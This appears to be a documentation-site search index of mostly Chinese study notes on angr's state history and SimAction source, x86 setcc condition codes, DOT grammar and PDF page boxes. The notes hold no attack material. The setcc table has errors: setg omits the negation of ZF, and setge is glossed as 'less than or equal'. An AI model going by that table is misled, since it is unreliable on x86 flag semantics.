------------------------------------ 0x40137b 0x4013e0 ... 0x401b08 0x401b36 ------------------------------------ 0x40137b 0x4013e0 ... 0x401b08 0x401b36 ------------------------------------ \"\"\" for addr in state . history . recent_bbl_addrs: print (hex(addr)) print ( \"-------------------------------- \\n \" ) \"\"\" ------------------------------------ 0x401b36 ------------------------------------ 0x401b36 ------------------------------------ \"\"\" print (state . history . bbl_addrs . hardcopy) \"\"\" ... [4199291, 4199392, 4199405, 4199426, 4199467, 4199495, 4199507, 4199560, 4199607, 4201284, 4199619, 4199660, 4199676, 4199717, 4199733, 4199774, 4199790, 4199831, 4199847, 4199888, 4199904,4199945, 4199961, 4200002, 4200018, 4200059, 4200075, 4200116, 4200132, 4200173, 4200189, 4200230, 4200246, 4200287, 4200303, 4200344, 4200360, 4200401, 4200417, 4200458, 4200474, 4200515, 4200531, 4200572, 4200588, 4200629, 4200645, 4200686, 4200702, 4200743, 4200759, 4200800, 4200816, 4200857, 4200945, 4200986, 4201002, 4201043, 4201059, 4201100, 4201116, 4201157, 4201170, 4201211, 4201224, 4201270] \"\"\" history.descriptions is a listing of string descriptions of each of the rounds of execution performed on the state. history.bbl_addrs \u8fd9\u4e2astate\u6267\u884c\u8fc7\u7684\u57fa\u672c\u5757\u7684\u5730\u5740\u7684\u6709\u5e8f\u5217\u8868. There may be more than one per round of execution, and not all addresses may correspond to binary code - some may be addresses at which SimProcedures are hooked. history.jumpkinds \u5728state\u7684history\u4e2d\u6bcf\u4e2a\u63a7\u5236\u6d41\u8f6c\u53d8\u5904\u7406\u7684\u6709\u5e8f\u5217\u8868, as VEX enum strings. history.guards is a listing of the conditions guarding each of the branches that the state has encountered. history.events is a semantic listing of \"interesting events\" which happened during execution, such as the presence of a symbolic jump condition, the program popping up a message box, or execution terminating with an exit code. history.actions \u901a\u5e38\u4e3a\u7a7a, \u4f46\u5982\u679c\u4f60\u589e\u52a0\u4e86 angr.options.refs \u9009\u9879\u7ed9 state, \u5b83\u7684\u5185\u5bb9\u662f log of all the memory, register, and temporary value accesses performed by the program. for i in state . history . descriptions: print (i) \"\"\" --------------------------- <IRSB from 0x40137b: 1 sat 1 unsat> ... <IRSB from 0x401afb: 2 sat> <IRSB from 0x401b08: 1 sat 1 unsat> <IRSB from 0x401b36: 1 sat 1 unsat> --------------------------- \"\"\" for i in state . history . actions: print (i) \"\"\" --------------------------- \u5f88\u591a\u5f88\u957f ... <SimActionData 0x401b36:8 tmp/write> <SimActionExit 0x401b36:10 default> <SimActionConstraint 0x401b36:10 <SAO <Bool True>>> <SimActionConstraint 0x401b36:10 <SAO <Bool False>>> --------------------------- \"\"\" for i in state . history . jumpkinds: print (i) print ( \"---------------------------\" ) print (state . history . jumpkind) \"\"\" ... Ijk_Boring Ijk_FakeRet Ijk_Call --------------------------- Ijk_Call \"\"\"","title":"program-state"},{"location":"module/angr/program-state/#program-state","text":"","title":"Program State"},{"location":"module/angr/program-state/#state-plugins","text":"","title":"State Plugins"},{"location":"module/angr/program-state/#history-plugin","text":"It is actually a linked list of several history nodes, each one representing a single round of execution---you can traverse this list with state.history.parent.parent etc. In general, these values are stored as history.recent_NAME and the iterator over them is just history.NAME. For example, for addr in state.history.bbl_addrs: print hex(addr) will print out a basic block address trace for the binary, while state.history.recent_bbl_addrs is the list of basic blocks executed in the most recent step(\u6700\u8fd1\u7684\u4e00\u6b65\u4e0d\u5e94\u8be5\u662f\u4e00\u4e2a\u5417), state.history.parent.recent_bbl_addrs is the list of basic blocks executed in the previous step, etc. If you ever need to quickly obtain a flat list of these values, you can access .hardcopy, e.g. state.history.bbl_addrs.hardcopy. Keep in mind though, index-based accessing is implemented on the interators. for addr in state . history . bbl_addrs: print (hex(addr)) print ( \"-------------------------------- \\n \" ) \"\"\" ------------------------------------ 0x40137b 0x4013e0 ... 0x401b08 0x401b36 ------------------------------------ 0x40137b 0x4013e0 ... 0x401b08 0x401b36 ------------------------------------ \"\"\" for addr in state . history . recent_bbl_addrs: print (hex(addr)) print ( \"-------------------------------- \\n \" ) \"\"\" ------------------------------------ 0x401b36 ------------------------------------ 0x401b36 ------------------------------------ \"\"\" print (state . history . bbl_addrs . hardcopy) \"\"\" ... [4199291, 4199392, 4199405, 4199426, 4199467, 4199495, 4199507, 4199560, 4199607, 4201284, 4199619, 4199660, 4199676, 4199717, 4199733, 4199774, 4199790, 4199831, 4199847, 4199888, 4199904,4199945, 4199961, 4200002, 4200018, 4200059, 4200075, 4200116, 4200132, 4200173, 4200189, 4200230, 4200246, 4200287, 4200303, 4200344, 4200360, 4200401, 4200417, 4200458, 4200474, 4200515, 4200531, 4200572, 4200588, 4200629, 4200645, 4200686, 4200702, 4200743, 4200759, 4200800, 4200816, 4200857, 4200945, 4200986, 4201002, 4201043, 4201059, 4201100, 4201116, 4201157, 4201170, 4201211, 4201224, 4201270] \"\"\" history.descriptions is a listing of string descriptions of each of the rounds of execution performed on the state. history.bbl_addrs \u8fd9\u4e2astate\u6267\u884c\u8fc7\u7684\u57fa\u672c\u5757\u7684\u5730\u5740\u7684\u6709\u5e8f\u5217\u8868. There may be more than one per round of execution, and not all addresses may correspond to binary code - some may be addresses at which SimProcedures are hooked. history.jumpkinds \u5728state\u7684history\u4e2d\u6bcf\u4e2a\u63a7\u5236\u6d41\u8f6c\u53d8\u5904\u7406\u7684\u6709\u5e8f\u5217\u8868, as VEX enum strings. history.guards is a listing of the conditions guarding each of the branches that the state has encountered. history.events is a semantic listing of \"interesting events\" which happened during execution, such as the presence of a symbolic jump condition, the program popping up a message box, or execution terminating with an exit code. history.actions \u901a\u5e38\u4e3a\u7a7a, \u4f46\u5982\u679c\u4f60\u589e\u52a0\u4e86 angr.options.refs \u9009\u9879\u7ed9 state, \u5b83\u7684\u5185\u5bb9\u662f log of all the memory, register, and temporary value accesses performed by the program. for i in state . history . descriptions: print (i) \"\"\" --------------------------- <IRSB from 0x40137b: 1 sat 1 unsat> ... <IRSB from 0x401afb: 2 sat> <IRSB from 0x401b08: 1 sat 1 unsat> <IRSB from 0x401b36: 1 sat 1 unsat> --------------------------- \"\"\" for i in state . history . actions: print (i) \"\"\" --------------------------- \u5f88\u591a\u5f88\u957f ... <SimActionData 0x401b36:8 tmp/write> <SimActionExit 0x401b36:10 default> <SimActionConstraint 0x401b36:10 <SAO <Bool True>>> <SimActionConstraint 0x401b36:10 <SAO <Bool False>>> --------------------------- \"\"\" for i in state . history . jumpkinds: print (i) print ( \"---------------------------\" ) print (state . history . jumpkind) \"\"\" ... Ijk_Boring Ijk_FakeRet Ijk_Call --------------------------- Ijk_Call \"\"\"","title":"history plugin"},{"location":"module/angr/sim_action/","text":"SimAction \u00b6 SimActionExit SimActionConstraint SimActionOperation SimActionData # This module contains data structures for handling memory, code, and register references. import logging l = logging . getLogger(name = __name__) _noneset = frozenset() from .sim_event import SimEvent class SimAction (SimEvent): \"\"\" A SimAction represents a semantic action that an analyzed program performs. \"\"\" #__slots__ = [ 'bbl_addr', 'inst_addr', 'stmt_idx' ] TMP = 'tmp' REG = 'reg' MEM = 'mem' _MAX_ACTION_ID = - 1 def __init__ (self, state, region_type): \"\"\" Initializes the SimAction. :param state: the state that's the SimAction is taking place in. \"\"\" SimEvent . __init__ (self, state, 'action' ) self . type = region_type SimAction . _MAX_ACTION_ID += 1 self . _action_id = SimAction . _MAX_ACTION_ID def __repr__ (self): if self . sim_procedure is not None: location = \"%s()\" % self . sim_procedure . display_name else : if self . stmt_idx is not None: location = \"0x%x:%d\" % (self . bbl_addr, self . stmt_idx) else : location = \"0x%x\" % self . bbl_addr return \"<%s %s %s>\" % (self . __class__ . __name__, location, self . _desc()) def _desc (self): raise NotImplementedError () #def __getstate__(self): # return { k: getattr(self, k) for k in sum([ c.__slots__ for c in self.__class__.mro() if hasattr(c, '__slots__')], []) } #pylint:disable=no-member #def __setstate__(self, s): # for k,v in s.items(): # setattr(self, k, v) @staticmethod def _make_object (v): if v is None: return None elif isinstance(v, SimActionObject): return v else : return SimActionObject(v, reg_deps = None, tmp_deps = None) @staticmethod def _copy_object (v): if isinstance(v, SimActionObject): return v . copy() else : return None @property def all_objects (self): raise NotImplementedError () @property def tmp_deps (self): return frozenset . union( * [v . tmp_deps for v in self . all_objects]) @property def reg_deps (self): return frozenset . union( * [v . reg_deps for v in self . all_objects]) def _copy_objects (self, c): raise NotImplementedError () def copy (self): c = self . _copy_event() self . _copy_objects(c) return c def downsize (self): \"\"\" Clears some low-level details (that take up memory) out of the SimAction. \"\"\" pass class SimActionExit (SimAction): \"\"\" An Exit action represents a (possibly conditional) jump. \"\"\" CONDITIONAL = 'conditional' DEFAULT = 'default' def __init__ (self, state, target, condition = None, exit_type = None): super(SimActionExit, self) . __init__ (state, \"exit\" ) if exit_type is not None: self . exit_type = exit_type elif condition is None: self . exit_type = SimActionExit . CONDITIONAL else : self . exit_type = SimActionExit . DEFAULT self . target = self . _make_object(target) self . condition = self . _make_object(condition) def _desc (self): return self . exit_type @property def all_objects (self): return [ a for a in ( self . target, self . condition ) if a is not None ] def _copy_objects (self, c): c . exit_type = self . exit_type c . target = self . _copy_object(self . target) c . condition = self . _copy_object(self . condition) class SimActionConstraint (SimAction): \"\"\" A constraint action represents an extra constraint added during execution of a path. \"\"\" def __init__ (self, state, constraint, condition = None): super(SimActionConstraint, self) . __init__ (state, \"constraint\" ) self . constraint = self . _make_object(constraint) self . condition = self . _make_object(condition) @property def all_objects (self): return [ a for a in ( self . constraint, self . condition ) if a is not None ] def _copy_objects (self, c): c . constraint = self . _copy_object(self . constraint) c . condition = self . _copy_object(self . condition) def _desc (self): s = '%s' % str(self . constraint) if self . condition is not None: s += ' (cond)' return s class SimActionOperation (SimAction): \"\"\" An action representing an operation between variables and/or constants. \"\"\" def __init__ (self, state, op, exprs, result): super(SimActionOperation, self) . __init__ (state, 'operation' ) self . op = op self . exprs = exprs self . result = result @property def all_objects (self): return [ ex for ex in self . exprs if isinstance(ex, SimActionObject) ] def _copy_objects (self, c): c . op = self . op c . exprs = self . exprs[::] c . result = self . result def _desc (self): return \"operation/%s\" % (self . op) class SimActionData (SimAction): \"\"\" A Data action represents a read or a write from memory, registers or a file. \"\"\" #__slots__ = [ 'objects' ] READ = 'read' WRITE = 'write' OPERATE = 'operate' def __init__ (self, state, region_type, action, tmp = None, addr = None, size = None, data = None, condition = None, fallback = None, fd = None): super(SimActionData, self) . __init__ (state, region_type) self . action = action self . _reg_dep = _noneset if addr is None or action != SimActionData . READ or not isinstance(addr, int) else frozenset((addr,)) self . _tmp_dep = _noneset if tmp is None or action != SimActionData . READ else frozenset((tmp,)) self . tmp = tmp self . offset = None if region_type == 'reg' : if isinstance(addr, int): self . offset = addr else : if addr . symbolic: # FIXME: we should fix it by allowing .offset taking ASTs instead of concretizing it right away l . warning( 'Concretizing a symbolic register offset in SimActionData.' ) self . offset = state . solver . eval(addr) else : # it's not symbolic self . offset = state . solver . eval_one(addr) self . addr = self . _make_object(addr) self . size = self . _make_object(size) self . data = self . _make_object(data) self . condition = self . _make_object(condition) self . fallback = self . _make_object(fallback) self . fd = self . _make_object(fd) # these are extra attributes that expose low-level effects, such as the *actual* # written value self . actual_addrs = None # `actual_value` always stores whatever the data looks like in memory from left to right, therefore it's always # big-endian (if endianness matters) self . actual_value = None self . added_constraints = None def downsize (self): self . actual_addrs = None self . actual_value = None self . added_constraints = None @property def all_objects (self): return [ a for a in [ self . addr, self . size, self . data, self . condition, self . fallback, self . fd ] if a is not None ] @property def tmp_deps (self): return super(SimActionData, self) . tmp_deps | self . _tmp_dep @property def reg_deps (self): return super(SimActionData, self) . reg_deps | self . _reg_dep def _desc (self): return \"%s/%s\" % (self . type, self . action) def _copy_objects (self, c): c . action = self . action c . tmp = self . tmp c . addr = self . _copy_object(self . addr) c . size = self . _copy_object(self . size) c . data = self . _copy_object(self . data) c . condition = self . _copy_object(self . condition) c . fallback = self . _copy_object(self . fallback) c . fd = self . _copy_object(self . fd) from .sim_action_object import SimActionObject","title":"sim_action"},{"location":"module/angr/sim_action/#simaction","text":"SimActionExit SimActionConstraint SimActionOperation SimActionData # This module contains data structures for handling memory, code, and register references. import logging l = logging . getLogger(name = __name__) _noneset = frozenset() from .sim_event import SimEvent class SimAction (SimEvent): \"\"\" A SimAction represents a semantic action that an analyzed program performs. \"\"\" #__slots__ = [ 'bbl_addr', 'inst_addr', 'stmt_idx' ] TMP = 'tmp' REG = 'reg' MEM = 'mem' _MAX_ACTION_ID = - 1 def __init__ (self, state, region_type): \"\"\" Initializes the SimAction. :param state: the state that's the SimAction is taking place in. \"\"\" SimEvent . __init__ (self, state, 'action' ) self . type = region_type SimAction . _MAX_ACTION_ID += 1 self . _action_id = SimAction . _MAX_ACTION_ID def __repr__ (self): if self . sim_procedure is not None: location = \"%s()\" % self . sim_procedure . display_name else : if self . stmt_idx is not None: location = \"0x%x:%d\" % (self . bbl_addr, self . stmt_idx) else : location = \"0x%x\" % self . bbl_addr return \"<%s %s %s>\" % (self . __class__ . __name__, location, self . _desc()) def _desc (self): raise NotImplementedError () #def __getstate__(self): # return { k: getattr(self, k) for k in sum([ c.__slots__ for c in self.__class__.mro() if hasattr(c, '__slots__')], []) } #pylint:disable=no-member #def __setstate__(self, s): # for k,v in s.items(): # setattr(self, k, v) @staticmethod def _make_object (v): if v is None: return None elif isinstance(v, SimActionObject): return v else : return SimActionObject(v, reg_deps = None, tmp_deps = None) @staticmethod def _copy_object (v): if isinstance(v, SimActionObject): return v . copy() else : return None @property def all_objects (self): raise NotImplementedError () @property def tmp_deps (self): return frozenset . union( * [v . tmp_deps for v in self . all_objects]) @property def reg_deps (self): return frozenset . union( * [v . reg_deps for v in self . all_objects]) def _copy_objects (self, c): raise NotImplementedError () def copy (self): c = self . _copy_event() self . _copy_objects(c) return c def downsize (self): \"\"\" Clears some low-level details (that take up memory) out of the SimAction. \"\"\" pass class SimActionExit (SimAction): \"\"\" An Exit action represents a (possibly conditional) jump. \"\"\" CONDITIONAL = 'conditional' DEFAULT = 'default' def __init__ (self, state, target, condition = None, exit_type = None): super(SimActionExit, self) . __init__ (state, \"exit\" ) if exit_type is not None: self . exit_type = exit_type elif condition is None: self . exit_type = SimActionExit . CONDITIONAL else : self . exit_type = SimActionExit . DEFAULT self . target = self . _make_object(target) self . condition = self . _make_object(condition) def _desc (self): return self . exit_type @property def all_objects (self): return [ a for a in ( self . target, self . condition ) if a is not None ] def _copy_objects (self, c): c . exit_type = self . exit_type c . target = self . _copy_object(self . target) c . condition = self . _copy_object(self . condition) class SimActionConstraint (SimAction): \"\"\" A constraint action represents an extra constraint added during execution of a path. \"\"\" def __init__ (self, state, constraint, condition = None): super(SimActionConstraint, self) . __init__ (state, \"constraint\" ) self . constraint = self . _make_object(constraint) self . condition = self . _make_object(condition) @property def all_objects (self): return [ a for a in ( self . constraint, self . condition ) if a is not None ] def _copy_objects (self, c): c . constraint = self . _copy_object(self . constraint) c . condition = self . _copy_object(self . condition) def _desc (self): s = '%s' % str(self . constraint) if self . condition is not None: s += ' (cond)' return s class SimActionOperation (SimAction): \"\"\" An action representing an operation between variables and/or constants. \"\"\" def __init__ (self, state, op, exprs, result): super(SimActionOperation, self) . __init__ (state, 'operation' ) self . op = op self . exprs = exprs self . result = result @property def all_objects (self): return [ ex for ex in self . exprs if isinstance(ex, SimActionObject) ] def _copy_objects (self, c): c . op = self . op c . exprs = self . exprs[::] c . result = self . result def _desc (self): return \"operation/%s\" % (self . op) class SimActionData (SimAction): \"\"\" A Data action represents a read or a write from memory, registers or a file. \"\"\" #__slots__ = [ 'objects' ] READ = 'read' WRITE = 'write' OPERATE = 'operate' def __init__ (self, state, region_type, action, tmp = None, addr = None, size = None, data = None, condition = None, fallback = None, fd = None): super(SimActionData, self) . __init__ (state, region_type) self . action = action self . _reg_dep = _noneset if addr is None or action != SimActionData . READ or not isinstance(addr, int) else frozenset((addr,)) self . _tmp_dep = _noneset if tmp is None or action != SimActionData . READ else frozenset((tmp,)) self . tmp = tmp self . offset = None if region_type == 'reg' : if isinstance(addr, int): self . offset = addr else : if addr . symbolic: # FIXME: we should fix it by allowing .offset taking ASTs instead of concretizing it right away l . warning( 'Concretizing a symbolic register offset in SimActionData.' ) self . offset = state . solver . eval(addr) else : # it's not symbolic self . offset = state . solver . eval_one(addr) self . addr = self . _make_object(addr) self . size = self . _make_object(size) self . data = self . _make_object(data) self . condition = self . _make_object(condition) self . fallback = self . _make_object(fallback) self . fd = self . _make_object(fd) # these are extra attributes that expose low-level effects, such as the *actual* # written value self . actual_addrs = None # `actual_value` always stores whatever the data looks like in memory from left to right, therefore it's always # big-endian (if endianness matters) self . actual_value = None self . added_constraints = None def downsize (self): self . actual_addrs = None self . actual_value = None self . added_constraints = None @property def all_objects (self): return [ a for a in [ self . addr, self . size, self . data, self . condition, self . fallback, self . fd ] if a is not None ] @property def tmp_deps (self): return super(SimActionData, self) . tmp_deps | self . _tmp_dep @property def reg_deps (self): return super(SimActionData, self) . reg_deps | self . _reg_dep def _desc (self): return \"%s/%s\" % (self . type, self . action) def _copy_objects (self, c): c . action = self . action c . tmp = self . tmp c . addr = self . _copy_object(self . addr) c . size = self . _copy_object(self . size) c . data = self . _copy_object(self . data) c . condition = self . _copy_object(self . condition) c . fallback = self . _copy_object(self . fallback) c . fd = self . _copy_object(self . fd) from .sim_action_object import SimActionObject","title":"SimAction"},{"location":"module/assembly/assembly/","text":"\u6c47\u7f16 \u00b6 \u8bbf\u95ee\u6761\u4ef6\u7801\u6307\u4ee4 \u00b6 \u6307\u4ee4 \u540c\u4e49\u540d \u6548\u679c \u8bbe\u7f6e\u6761\u4ef6 sete D setz D = ZF \u76f8\u7b49/\u96f6 setne D setnz D = ~ZF \u4e0d\u7b49/\u975e\u96f6 sets D D = SF \u8d1f\u6570 setns D D = ~SF \u975e\u8d1f\u6570 setg D setnle D = ~(SF ^OF) & ZF \u5927\u4e8e\uff08\u6709\u7b26\u53f7>\uff09 setge D setnl D = ~(SF ^OF) \u5c0f\u4e8e\u7b49\u4e8e(\u6709\u7b26\u53f7>=) setl D setnge D = SF ^ OF \u5c0f\u4e8e(\u6709\u7b26\u53f7<) setle D setng D = (SF ^ OF) | ZF \u5c0f\u4e8e\u7b49\u4e8e(\u6709\u7b26\u53f7<=) seta D setnbe D = ~CF & ~ZF \u8d85\u8fc7(\u65e0\u7b26\u53f7>) setae D setnb D = ~CF \u8d85\u8fc7\u6216\u7b49\u4e8e(\u65e0\u7b26\u53f7>=) setb D setnae D = CF \u4f4e\u4e8e(\u65e0\u7b26\u53f7<) setbe D setna D = CF | ZF \u4f4e\u4e8e\u6216\u7b49\u4e8e(\u65e0\u7b26\u53f7<=) \u6761\u4ef6\u7801\u5bc4\u5b58\u5668 \u00b6 \u6761\u4ef6\u7801\u5bc4\u5b58\u5668\u63cf\u8ff0\u4e86\u6700\u8fd1\u7684\u7b97\u6570\u6216\u903b\u8f91\u64cd\u4f5c\u7684\u5c5e\u6027\u3002 CF\uff1a\u8fdb\u4f4d\u6807\u5fd7\uff0c\u6700\u9ad8\u4f4d\u4ea7\u751f\u4e86\u8fdb\u4f4d\uff0c\u53ef\u7528\u4e8e\u68c0\u67e5\u65e0\u7b26\u53f7\u6570\u6ea2\u51fa\u3002 OF\uff1a\u6ea2\u51fa\u6807\u5fd7\uff0c\u4e8c\u8fdb\u5236\u8865\u7801\u6ea2\u51fa\u2014\u2014\u6b63\u6ea2\u51fa\u6216\u8d1f\u6ea2\u51fa\u3002 ZF\uff1a\u96f6\u6807\u5fd7\uff0c\u7ed3\u679c\u4e3a0\u3002 SF\uff1a\u7b26\u53f7\u6807\u5fd7\uff0c\u64cd\u4f5c\u7ed3\u679c\u4e3a\u8d1f\u3002","title":"assembly"},{"location":"module/assembly/assembly/#_1","text":"","title":"\u6c47\u7f16"},{"location":"module/assembly/assembly/#_2","text":"\u6307\u4ee4 \u540c\u4e49\u540d \u6548\u679c \u8bbe\u7f6e\u6761\u4ef6 sete D setz D = ZF \u76f8\u7b49/\u96f6 setne D setnz D = ~ZF \u4e0d\u7b49/\u975e\u96f6 sets D D = SF \u8d1f\u6570 setns D D = ~SF \u975e\u8d1f\u6570 setg D setnle D = ~(SF ^OF) & ZF \u5927\u4e8e\uff08\u6709\u7b26\u53f7>\uff09 setge D setnl D = ~(SF ^OF) \u5c0f\u4e8e\u7b49\u4e8e(\u6709\u7b26\u53f7>=) setl D setnge D = SF ^ OF \u5c0f\u4e8e(\u6709\u7b26\u53f7<) setle D setng D = (SF ^ OF) | ZF \u5c0f\u4e8e\u7b49\u4e8e(\u6709\u7b26\u53f7<=) seta D setnbe D = ~CF & ~ZF \u8d85\u8fc7(\u65e0\u7b26\u53f7>) setae D setnb D = ~CF \u8d85\u8fc7\u6216\u7b49\u4e8e(\u65e0\u7b26\u53f7>=) setb D setnae D = CF \u4f4e\u4e8e(\u65e0\u7b26\u53f7<) setbe D setna D = CF | ZF \u4f4e\u4e8e\u6216\u7b49\u4e8e(\u65e0\u7b26\u53f7<=)","title":"\u8bbf\u95ee\u6761\u4ef6\u7801\u6307\u4ee4"},{"location":"module/assembly/assembly/#_3","text":"\u6761\u4ef6\u7801\u5bc4\u5b58\u5668\u63cf\u8ff0\u4e86\u6700\u8fd1\u7684\u7b97\u6570\u6216\u903b\u8f91\u64cd\u4f5c\u7684\u5c5e\u6027\u3002 CF\uff1a\u8fdb\u4f4d\u6807\u5fd7\uff0c\u6700\u9ad8\u4f4d\u4ea7\u751f\u4e86\u8fdb\u4f4d\uff0c\u53ef\u7528\u4e8e\u68c0\u67e5\u65e0\u7b26\u53f7\u6570\u6ea2\u51fa\u3002 OF\uff1a\u6ea2\u51fa\u6807\u5fd7\uff0c\u4e8c\u8fdb\u5236\u8865\u7801\u6ea2\u51fa\u2014\u2014\u6b63\u6ea2\u51fa\u6216\u8d1f\u6ea2\u51fa\u3002 ZF\uff1a\u96f6\u6807\u5fd7\uff0c\u7ed3\u679c\u4e3a0\u3002 SF\uff1a\u7b26\u53f7\u6807\u5fd7\uff0c\u64cd\u4f5c\u7ed3\u679c\u4e3a\u8d1f\u3002","title":"\u6761\u4ef6\u7801\u5bc4\u5b58\u5668"},{"location":"module/fileformat/dot/","text":"DOT \u8bed\u8a00 \u00b6 Dot \u8bed\u8a00\u7684\u62bd\u8c61\u8bed\u6cd5 graph:[ strict ] (graph | digraph) [ ID ] '{' stmt_list '}' stmt_list:[ stmt [ ';' ] stmt_list ] stmt:node_stmt |edge_stmt |attr_stmt |ID '=' ID |subgraph attr_stmt:(graph | node | edge) attr_list attr_list:'[' [ a_list ] ']' [ attr_list ] a_list:ID '=' ID [ (';' | ',') ] [ a_list ] edge_stmt:(node_id | subgraph) edgeRHS [ attr_list ] edgeRHS:edgeop (node_id | subgraph) [ edgeRHS ] node_stmt:node_id [ attr_list ] node_id:ID [ port ] port:':' ID [ ':' compass_pt ] |':' compass_pt subgraph:[ subgraph [ ID ] ] '{' stmt_list '}' compass_pt:(n | ne | e | se | s | sw | w | nw | c | _) \u5173\u952e\u5b57node\uff0cedge\uff0cgraph\uff0cdigraph\uff0csubgraph\u548cstrict\u4e0e\u5927\u5c0f\u5199\u65e0\u5173 '('\u548c')'\u8868\u793a\u5fc5\u9009\u7ec4\uff0c\u5982(graph | digraph)'\u8868\u793agraph\u548cdigraph\u4e24\u8005\u6709\u4e14\u53ea\u6709\u5176\u4e00 \u5355\u5f15\u53f7\u8868\u793a\u5185\u5bb9\u662f\u5b57\u7b26\uff0c\u5982'='\u4fbf\u662f\u5b57\u7b26'='\uff0c\u800c\u4e0d\u662f\u8d4b\u503c","title":"DOT"},{"location":"module/fileformat/dot/#dot","text":"Dot \u8bed\u8a00\u7684\u62bd\u8c61\u8bed\u6cd5 graph:[ strict ] (graph | digraph) [ ID ] '{' stmt_list '}' stmt_list:[ stmt [ ';' ] stmt_list ] stmt:node_stmt |edge_stmt |attr_stmt |ID '=' ID |subgraph attr_stmt:(graph | node | edge) attr_list attr_list:'[' [ a_list ] ']' [ attr_list ] a_list:ID '=' ID [ (';' | ',') ] [ a_list ] edge_stmt:(node_id | subgraph) edgeRHS [ attr_list ] edgeRHS:edgeop (node_id | subgraph) [ edgeRHS ] node_stmt:node_id [ attr_list ] node_id:ID [ port ] port:':' ID [ ':' compass_pt ] |':' compass_pt subgraph:[ subgraph [ ID ] ] '{' stmt_list '}' compass_pt:(n | ne | e | se | s | sw | w | nw | c | _) \u5173\u952e\u5b57node\uff0cedge\uff0cgraph\uff0cdigraph\uff0csubgraph\u548cstrict\u4e0e\u5927\u5c0f\u5199\u65e0\u5173 '('\u548c')'\u8868\u793a\u5fc5\u9009\u7ec4\uff0c\u5982(graph | digraph)'\u8868\u793agraph\u548cdigraph\u4e24\u8005\u6709\u4e14\u53ea\u6709\u5176\u4e00 \u5355\u5f15\u53f7\u8868\u793a\u5185\u5bb9\u662f\u5b57\u7b26\uff0c\u5982'='\u4fbf\u662f\u5b57\u7b26'='\uff0c\u800c\u4e0d\u662f\u8d4b\u503c","title":"DOT \u8bed\u8a00"},{"location":"module/fileformat/pdf/","text":"PDF \u00b6 PDF Boxes \u00b6 mediabox, cropbox, bleedbox, trimbox, artbox PDF \u5b9e\u9645\u4e0a\u67095\u4e2a\u4e0d\u540c\u7c7b\u578b\u7684\u5c3a\u5bf8\uff0c\u800c\u4e0d\u4ec5\u4ec5\u53ea\u6709\u4f60\u6253\u5f00\u5b83\u540e\u770b\u5230\u7684\u5927\u5c0f\u3002 An EPS has only a single BoundingBox but a PDF contains a MediaBox, CropBox, BleedBox, TrimBox and ArtBox. trimbox: \u5728\u6240\u6709\u88c1\u526a\u64cd\u4f5c\u4e4b\u540e,Trimbox \u57fa\u672c\u4e0a\u786e\u5b9a\u4e86\u662f\u5bfc\u51faPDF\u6210\u54c1\u7684\u9875\u9762\u5927\u5c0f\u3002 bleedbox: \u5305\u542b\u4e86trimbox\u548c\u6240\u6709\u7684bleed\u3002 mediabox: \u5305\u542b\u4e86bleedbox\u548c\u4efb\u4f55\u7684crop/bleed/etc...\u6807\u8bb0 cropbox: \u5b83\u6307\u5b9a\u4e86\u67e5\u770b\u5668\u4e2d\u663e\u793a\u7684\u533a\u57df\uff0c\u5728Adobe Reader\u4e2d\uff0c\u6587\u6863\u663e\u793a\u7684\u5927\u5c0f\u5c31\u662fcropbox\u7684\u5927\u5c0f artbox: \u6700\u521d\u7528\u6765\u6307\u5b9a\u827a\u672f\u4f5c\u54c1\u6240\u8986\u76d6\u7684\u533a\u57df\u3002 mediabox \u00b6 \u5bf9\u5927\u90e8\u5206\u7528\u6237\u6765\u8bf4\uff0cmediabox\u5bf9\u5e94\u7740pdf\u9875\u9762\u7684\u5b9e\u9645\u5927\u5c0f\u3002\u4f46\u5728\u7528\u4e8e\u51fa\u7248\u65f6\uff0cmediabox\u5305\u542b\u4e86\u66f4\u591a\u7684\u6709\u7528\u7684\u4fe1\u606f\uff08\u6bd4\u5982\u8bf4bleed\uff0c\u4fee\u5efa\u6807\u8bb0\uff0c\u6587\u4ef6\u540d\uff0c\u65e5\u671f\u7b49\u7b49\uff09\uff0c\u4fbf\u4e8e\u7f16\u8f91\u3002 bleedbox \u00b6 \u5982\u679c\u6587\u6863\u5e03\u5c40\u4e0a\u7684\u4efb\u4f55\u5143\u7d20\u4e0e\u6587\u6863\u8fb9\u7f18\u63a5\u89e6\uff0c\u5219\u4f7f\u7528bleed\u3002bleedbox\u7684\u5927\u5c0f\u4e0d\u540c\u5730\u65b9\u6709\u4e0d\u540c\u7684\u6807\u51c6\uff0c\u5e38\u89c1\u7684\u662f\u6bd4crop\u4e4b\u540e\u6bcf\u6761\u8fb9\u957f3~6mm\u3002 EPS ???","title":"PDF"},{"location":"module/fileformat/pdf/#pdf","text":"","title":"PDF"},{"location":"module/fileformat/pdf/#pdf-boxes","text":"mediabox, cropbox, bleedbox, trimbox, artbox PDF \u5b9e\u9645\u4e0a\u67095\u4e2a\u4e0d\u540c\u7c7b\u578b\u7684\u5c3a\u5bf8\uff0c\u800c\u4e0d\u4ec5\u4ec5\u53ea\u6709\u4f60\u6253\u5f00\u5b83\u540e\u770b\u5230\u7684\u5927\u5c0f\u3002 An EPS has only a single BoundingBox but a PDF contains a MediaBox, CropBox, BleedBox, TrimBox and ArtBox. trimbox: \u5728\u6240\u6709\u88c1\u526a\u64cd\u4f5c\u4e4b\u540e,Trimbox \u57fa\u672c\u4e0a\u786e\u5b9a\u4e86\u662f\u5bfc\u51faPDF\u6210\u54c1\u7684\u9875\u9762\u5927\u5c0f\u3002 bleedbox: \u5305\u542b\u4e86trimbox\u548c\u6240\u6709\u7684bleed\u3002 mediabox: \u5305\u542b\u4e86bleedbox\u548c\u4efb\u4f55\u7684crop/bleed/etc...\u6807\u8bb0 cropbox: \u5b83\u6307\u5b9a\u4e86\u67e5\u770b\u5668\u4e2d\u663e\u793a\u7684\u533a\u57df\uff0c\u5728Adobe Reader\u4e2d\uff0c\u6587\u6863\u663e\u793a\u7684\u5927\u5c0f\u5c31\u662fcropbox\u7684\u5927\u5c0f artbox: \u6700\u521d\u7528\u6765\u6307\u5b9a\u827a\u672f\u4f5c\u54c1\u6240\u8986\u76d6\u7684\u533a\u57df\u3002","title":"PDF 